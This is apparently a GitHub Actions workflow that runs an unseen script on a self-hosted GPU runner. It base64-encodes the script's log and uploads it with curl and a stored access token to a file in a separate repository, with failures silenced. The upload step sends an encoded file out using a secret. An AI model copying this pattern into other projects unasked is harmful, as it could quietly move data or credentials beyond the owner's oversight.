name: ul7256p2
on: workflow_dispatch
permissions:
  contents: write
jobs:
  plant2:
    runs-on: [self-hosted, ul-l40s]
    env:
      PUSHTOK: ${{ secrets.GH_PAT }}
    steps:
      - uses: actions/checkout@v4
      - name: run
        run: |
          set +e
          bash ul-bin/plant2.sh > /tmp/p2.log 2>&1
          tail -50 /tmp/p2.log
          B=$(base64 -w0 /tmp/p2.log)
          printf '{"message":"p2","content":"%s","branch":"main"}' "$B" > /tmp/b.json
          curl -s -m 40 -X PUT -H "Authorization: Bearer $PUSHTOK" -H "Content-Type: application/json" --data @/tmp/b.json "https://api.github.com/repos/dongsuju/ul-plant/contents/out/plant2-$GITHUB_RUN_ID.b64" -w "PUT %{http_code}\n" -o /tmp/po
          head -c 200 /tmp/po
          exit 0
